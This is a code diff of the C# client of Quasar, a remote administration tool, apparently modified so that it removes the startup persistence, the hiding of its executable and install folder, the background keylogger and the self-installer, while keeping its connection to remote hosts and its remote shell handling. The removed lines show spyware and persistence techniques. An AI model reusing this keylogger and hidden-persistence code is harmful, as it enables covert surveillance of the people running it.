@@ -8,9 +8,7 @@ using xClient.Core.Commands;
 using xClient.Core.Cryptography;
 using xClient.Core.Data;
 using xClient.Core.Helper;
-using xClient.Core.Installation;
 using xClient.Core.Networking;
-using xClient.Core.Utilities;
 
 namespace xClient
 {
@@ -71,8 +69,6 @@ namespace xClient
             CommandHandler.CloseShell();
             if (CommandHandler.StreamCodec != null)
                 CommandHandler.StreamCodec.Dispose();
-            if (Keylogger.Instance != null)
-                Keylogger.Instance.Dispose();
             if (_msgLoop != null)
             {
                 _msgLoop.ExitThread();
@@ -96,57 +92,10 @@ namespace xClient
             
             FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
 
-            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
-            {
-                WindowsAccountHelper.StartUserIdleCheckThread();
+            WindowsAccountHelper.StartUserIdleCheckThread();
 
-                if (Settings.STARTUP)
-                {
-                    if (!Startup.AddToStartup())
-                        ClientData.AddToStartupFailed = true;
-                }
-
-                if (Settings.INSTALL && Settings.HIDEFILE)
-                {
-                    try
-                    {
-                        File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
-                    }
-                    catch (Exception)
-                    {
-                    }
-                }
-                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
-                {
-                    try
-                    {
-                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
-                        di.Attributes |= FileAttributes.Hidden;
-
-                    }
-                    catch (Exception)
-                    {
-                    }
-                }
-                if (Settings.ENABLELOGGER)
-                {
-                    new Thread(() =>
-                    {
-                        _msgLoop = new ApplicationContext();
-                        Keylogger logger = new Keylogger(15000);
-                        Application.Run(_msgLoop);
-                    }) {IsBackground = true}.Start();
-                }
-
-                ConnectClient = new QuasarClient(hosts);
-                return true;
-            }
-            else
-            {
-                MutexHelper.CloseMutex();
-                ClientInstaller.Install(ConnectClient);
-                return false;
-            }
+            ConnectClient = new QuasarClient(hosts);
+            return true;
         }
     }
 }
